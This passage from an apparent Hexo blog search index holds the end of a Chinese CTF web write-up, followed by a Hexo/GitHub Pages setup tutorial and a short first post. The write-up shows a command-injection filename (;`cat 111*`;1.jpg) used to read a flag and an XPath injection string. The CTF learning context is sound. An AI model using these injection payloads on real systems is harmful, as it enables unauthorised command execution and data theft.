class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$filename</span>)) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>        &#125;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;md5&quot;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;remove&quot;</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;remove&quot;</span>) &#123;<br>          <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>();<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>          <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>分析源码，发现有文件上传白名单（jpg|jpeg|gif|png|bmp后缀名）</p><p>继续分析，发现class FILE的<code>system(&quot;ls -all &quot; . $this-&gt;filename);</code>处存在命令拼接</p><p>但是有条件，必须保证文件名有且只有一个<code>.</code>，并且不能含有<code>\/</code></p><p>接下来想方法绕过</p><p>首先上传文件1111.jpg，文件内容为<code>ls /</code>用来查看根目录flag文件名</p><p>接下来上传名为<code>;`cat 111*`;1.jpg</code>的文件再进行<code>?filename=;`cat 111*`;1.jpg&amp;todo=show</code>，发现成功执行了命令，返回得到flag路径<code>adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code></p><p>最后更换文件内容为<code>cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code>，再次执行命令得到flag</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h3><p>题目中xpath查询语句拼接后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;]<br></code></pre></td></tr></table></figure><p>其实后面不重要，因为admin的引号已经将查询语句闭合了</p><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">/accounts/user[username=&#x27;admin&#x27;]<br></code></pre></td></tr></table></figure><p>于是相当于查询是否有admin账户，得到结果</p><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p><code>;</code>可以分隔一串命令</p><p><code>`</code>Linux中反引号的作用是在将反引号内的命令处理完毕之后，会将返回的信息传给反引号的位置，再次执行命令</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了网上好多wp，发现我的做法貌似是非预期</p><p>预期解是md5_file函数结合phar打的</p><p>太菜了太菜了，别的题目为什么不写wp，因为都不会。。。。。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xpath注入</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用hexo框架搭建github静态博客</title>
    <link href="/2023/06/30/hexo/"/>
    <url>/2023/06/30/hexo/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>第一次使用 hexo 搭建静态网站，踩了好多坑，立此贴记录一下</p><h2 id="本地配置Hexo"><a href="#本地配置Hexo" class="headerlink" title="本地配置Hexo"></a>本地配置Hexo</h2><h3 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h3><p><a href="https://nodejs.org/zh-cn">Nodejs官方地址</a></p><p>从以上链接下载 nodejs 安装（官网下载稍慢，建议翻墙）</p><h3 id="设置npm淘宝镜像站"><a href="#设置npm淘宝镜像站" class="headerlink" title="设置npm淘宝镜像站"></a>设置npm淘宝镜像站</h3><p>npm 默认的源的下载速度可能很慢，建议使用淘宝镜像替换。执行下面的命令，将 npm 的源设置成淘宝镜像站。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm config set registry &quot;https://registry.npm.taobao.org&quot;<br></code></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p><a href="https://git-scm.com/downloads/">git官方链接</a></p><p>从以上链接下载 git 安装</p><p>一路确认，安装时要勾选 <strong>Add to PATH</strong> 选项</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>cmd 输入以下命令观察是否执行正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git --version<br>npm -v<br></code></pre></td></tr></table></figure><h3 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h3><p>执行以下命令安装 hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install hexo-cli g<br></code></pre></td></tr></table></figure><p>在电脑的某个磁盘或路径新建一个文件夹(名字可以随便取)，比如我的是 D:\blog，由于这个文件夹将来就作为您存放博客的地方，所以最好不要随便放</p><p>在 D:\blog 文件夹下右键打开 Git Bash Here，输入命令: <code>hexo init</code> 进行初始化</p><p>hexo 会自动下载一些文件到这个目录</p><p>接着在 cmd 中安装其他 hexo 插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install<br>npm install hexo-server --save<br>npm install hexo-admin --save<br>npm install hexo-generator-archive --save<br>npm install hexo-generator-feed --save<br>npm install hexo-generator-search --save<br>npm install hexo-generator-tag --save<br>npm install hexo-deployer-git --save<br>npm install hexo-generator-sitemap --save<br></code></pre></td></tr></table></figure><p>至此，本地 hexo 配置完毕。</p><p>现在可以使用 hexo 搭建本地服务器来使用</p><p>使用 <code>hexo g</code> 生成静态页面，使用 <code>hexo s</code> 开启本地服务器，接下来可以用浏览器地址栏输入 <code>localhost:4000</code> 来看见刚刚创建的博客</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><h3 id="配置-Github"><a href="#配置-Github" class="headerlink" title="配置 Github"></a>配置 Github</h3><p>注册 github 账号，并在主页创建仓库，名字为 [yourname].github.io</p><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>打开git bash终端设置 user.name 和 user.email</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;你的GitHub用户名&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;你的GitHub注册邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>生成ssh密匙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的GitHub注册邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>将公匙添加到 github 上</p><h3 id="将hexo博客部署到github上"><a href="#将hexo博客部署到github上" class="headerlink" title="将hexo博客部署到github上"></a>将hexo博客部署到github上</h3><p>修改配置文件 <strong>blog&#x2F;_config.yml</strong>，修改deploy项的内容，如下所示：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1.png" class=""><p>注意：</p><ul><li>分支（branch）要与自己创建仓库的分支名称一致（注意master与main的区别）</li><li>冒号后面必须添加一个空格</li><li>保持缩进格式一致</li></ul><p>给出示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>    <span class="hljs-attr">repo:</span> <span class="hljs-string">https://github.com/lazy-forever/lazy-forever.github.io.git</span><br>    <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span> <br></code></pre></td></tr></table></figure><h3 id="部署hexo"><a href="#部署hexo" class="headerlink" title="部署hexo"></a>部署hexo</h3><p>输入下面的命令将hexo博客部署到github中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo cl  #清理之前生成的文件<br>hexo g   #生成静态页面<br>hexo d   #部署<br></code></pre></td></tr></table></figure><p>隔一段时间后打开浏览器，输入 [yourname].github.io 即可看到我们部署的博客</p><h2 id="关于翻墙"><a href="#关于翻墙" class="headerlink" title="关于翻墙"></a>关于翻墙</h2><p>众所周知，中国大陆境内对于 github 的访问一直处于时常能连上时常连不上的状态，因此如果我们在执行 <code>hexo d</code> 命令时翻墙，会让部署的过程更加丝滑。</p><p>我的电脑一直在使用 clash 进行翻墙，而在 cmd 中使用<code>hexo d</code>时，clash 必须用以管理员身份打开并开启增强功能，如图：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2.png" class="">]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My First Blog</title>
    <link href="/2023/05/29/hello-world/"/>
    <url>/2023/05/29/hello-world/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是我的第一篇博客。</p>]]></content>
    
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
